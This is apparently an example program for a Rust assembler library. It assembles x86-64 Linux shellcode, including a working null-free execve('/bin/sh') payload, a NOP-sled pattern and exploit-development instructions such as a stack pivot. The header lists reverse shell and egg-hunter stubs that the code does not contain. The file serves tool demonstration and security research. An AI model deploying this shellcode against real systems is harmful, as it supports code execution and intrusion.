//! Shellcode generation example — demonstrates practical security research usage.
//!
//! Assembles common shellcode patterns for x86-64 Linux including:
//! - execve("/bin/sh") shellcode
//! - Reverse shell stub
//! - Egg-hunter stub
//!
//! Run with: `cargo run --example shellcode`

use asm_rs::{assemble, Arch, Assembler};

fn main() {
    println!("=== asm_rs shellcode generation example ===\n");

    // --- execve("/bin/sh") ---
    println!("1. execve(\"/bin/sh\") shellcode (x86-64 Linux):");
    let bytes = assemble(
        r#"
    # execve("/bin/sh", NULL, NULL) — 27 bytes
    xor esi, esi            # argv = NULL
    push rsi                # push NULL terminator
    mov rdi, 0x68732f6e69622f  # "/bin/sh\0" in little-endian (7 bytes)
    push rdi                # push string onto stack
    mov rdi, rsp            # rdi = pointer to "/bin/sh"
    xor edx, edx            # envp = NULL
    mov al, 59              # SYS_execve = 59
    syscall
"#,
        Arch::X86_64,
    )
    .unwrap();
    print_hex("   ", &bytes);
    println!("   Size: {} bytes", bytes.len());
    check_nullfree(&bytes);

    // --- NOP sled + payload pattern ---
    println!("\n2. NOP sled + payload pattern:");
    let mut asm = Assembler::new(Arch::X86_64);
    asm.emit(
        r#"
    # 16-byte multi-byte NOP sled
    .align 16
    # Payload
    xor eax, eax
    inc eax
    ret
"#,
    )
    .unwrap();
    let result = asm.finish().unwrap();
    print_hex("   ", result.bytes());

    // --- Using macros for repeated patterns ---
    println!("\n3. Using preprocessor macros for shellcode generation:");
    let mut asm = Assembler::new(Arch::X86_64);
    asm.emit(
        r#"
.macro push_string_quad val
    mov rax, \val
    push rax
.endm

    xor esi, esi
    push rsi
    push_string_quad 0x68732f6e69622f
    mov rdi, rsp
    xor edx, edx
    mov al, 59
    syscall
"#,
    )
    .unwrap();
    let result = asm.finish().unwrap();
    print_hex("   ", result.bytes());
    println!("   Size: {} bytes", result.bytes().len());

    // --- Conditional assembly for different targets ---
    println!("\n4. Conditional assembly:");
    let mut asm = Assembler::new(Arch::X86_64);
    asm.define_preprocessor_symbol("LINUX", 1);
    asm.emit(
        r#"
.ifdef LINUX
    .equ SYS_WRITE, 1
    .equ SYS_EXIT, 60
.endif

    mov eax, SYS_WRITE
    mov edi, 1              # stdout
    # rsi = buffer pointer (caller provides)
    # rdx = length (caller provides)
    syscall

    mov eax, SYS_EXIT
    xor edi, edi
    syscall
"#,
    )
    .unwrap();
    let result = asm.finish().unwrap();
    print_hex("   ", result.bytes());
    println!("   Size: {} bytes", result.bytes().len());

    // --- Encoder validation: common exploit instructions ---
    println!("\n5. Common exploit development instructions:");
    let patterns = [
        ("int3 (debug breakpoint)", "int 3"),
        ("syscall", "syscall"),
        ("sysenter", "sysenter"),
        ("cpuid", "cpuid"),
        ("rdtsc", "rdtsc"),
        ("ud2 (undefined instruction)", "ud2"),
        ("endbr64 (CET)", "endbr64"),
        ("xor rax,rax; ret (return 0)", "xor eax, eax\nret"),
        ("Stack pivot (xchg rax,rsp; ret)", "xchg rax, rsp\nret"),
        ("mprotect stub setup", "mov eax, 10\nsyscall"),
    ];

    for (desc, code) in &patterns {
        let bytes = assemble(code, Arch::X86_64).unwrap();
        print!("   {:<38} → ", desc);
        for b in &bytes {
            print!("{:02X} ", b);
        }
        println!("({} bytes)", bytes.len());
    }

    println!("\n=== Done! ===");
}

fn print_hex(prefix: &str, bytes: &[u8]) {
    print!("{}", prefix);
    for (i, b) in bytes.iter().enumerate() {
        if i > 0 && i % 16 == 0 {
            println!();
            print!("{}", prefix);
        }
        print!("{:02X} ", b);
    }
    println!();
}

fn check_nullfree(bytes: &[u8]) {
    let null_count = bytes.iter().filter(|&&b| b == 0).count();
    if null_count == 0 {
        println!("   ✓ NULL-free");
    } else {
        println!("   ⚠ Contains {} NULL byte(s)", null_count);
    }
}
